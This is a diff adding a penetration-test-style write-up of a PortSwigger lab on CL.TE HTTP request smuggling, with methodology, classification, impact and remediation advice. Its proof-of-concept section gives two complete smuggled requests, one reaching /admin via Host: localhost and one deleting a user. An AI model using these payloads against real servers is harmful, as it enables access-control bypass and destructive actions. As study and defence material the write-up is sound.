@@ -1,0 +1,157 @@
+# HTTP Request Smuggling (CL.TE) - Bypassing Front-End Security Controls
+
+## Executive Summary
+
+A CL.TE HTTP Request Smuggling vulnerability was identified due to inconsistent HTTP request parsing between the front-end proxy and the back-end application server. The front-end relied on the **Content-Length** header while the back-end prioritized the **Transfer-Encoding: chunked** header.
+
+This parsing discrepancy allowed an attacker to smuggle a second HTTP request that bypassed the front-end security controls. By crafting a malicious request containing an internal request with the `Host: localhost` header, it was possible to access the administrative interface and invoke privileged functionality to delete the user **carlos**.
+
+---
+
+# Vulnerability Information
+
+**Category:** HTTP Request Smuggling
+
+**Subtype:** CL.TE (Content-Length / Transfer-Encoding)
+
+**Severity:** High
+
+**CWE:** CWE-444 – Inconsistent Interpretation of HTTP Requests
+
+**OWASP Top 10:** A05 – Security Misconfiguration
+
+---
+
+# Affected Component
+
+Front-end reverse proxy communicating with the back-end application server.
+
+---
+
+# Technical Description
+
+The application architecture consisted of a front-end proxy forwarding requests to a back-end server.
+
+The front-end determined the request boundary using the `Content-Length` header, while the back-end parsed the request using `Transfer-Encoding: chunked`.
+
+Because each component interpreted the request differently, an attacker could inject a second hidden HTTP request that was invisible to the front-end but processed by the back-end.
+
+The injected request used:
+
+```http
+GET /admin HTTP/1.1
+Host: localhost
+```
+
+allowing the attacker to bypass front-end access restrictions.
+
+---
+
+# Methodology
+
+1. Verified that direct access to `/admin` was blocked.
+2. Sent a crafted CL.TE request through Burp Repeater.
+3. Confirmed successful desynchronization.
+4. Injected a smuggled request targeting `/admin`.
+5. Verified access to the administration interface.
+6. Modified the smuggled request to invoke:
+
+```http
+GET /admin/delete?username=carlos
+```
+
+7. Confirmed successful deletion of the target user.
+
+---
+
+# Proof of Concept
+
+Initial smuggled request:
+
+```http
+POST / HTTP/1.1
+Host: LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 116
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+```
+
+Final exploit:
+
+```http
+POST / HTTP/1.1
+Host: LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 139
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+```
+
+---
+
+# Impact Assessment
+
+Successful exploitation allows an attacker to bypass front-end security controls and execute arbitrary HTTP requests on the back-end.
+
+Potential consequences include:
+
+* Administrative interface access.
+* Authentication bypass.
+* Access to internal-only endpoints.
+* Privilege escalation.
+* Cache poisoning.
+* Session hijacking.
+* Chained attacks with SSRF or other HTTP desynchronization vulnerabilities.
+
+---
+
+# Root Cause
+
+The front-end and back-end servers used different mechanisms to determine the end of an HTTP request.
+
+* Front-end → `Content-Length`
+* Back-end → `Transfer-Encoding`
+
+The inconsistent parsing enabled HTTP request desynchronization.
+
+---
+
+# Remediation
+
+* Reject requests containing both `Content-Length` and `Transfer-Encoding`.
+* Ensure all intermediaries parse HTTP requests consistently.
+* Normalize HTTP parsing across reverse proxies and application servers.
+* Upgrade or patch vulnerable proxy software.
+* Deploy request desynchronization detection mechanisms.
+* Follow the recommendations in RFC 7230 regarding conflicting message framing headers.
+
+---
+
+# References
+
+* PortSwigger Web Security Academy – HTTP Request Smuggling
+* RFC 7230 – Hypertext Transfer Protocol (HTTP/1.1): Message Syntax and Routing
+* CWE-444 – Inconsistent Interpretation of HTTP Requests
+
+---
+
+# Conclusion
+
+The application was vulnerable to a CL.TE HTTP Request Smuggling attack caused by inconsistent request parsing between the front-end and back-end servers. By exploiting this desynchronization, it was possible to bypass front-end access controls, access the internal administrative interface, and execute privileged functionality, resulting in the successful deletion of the target user.
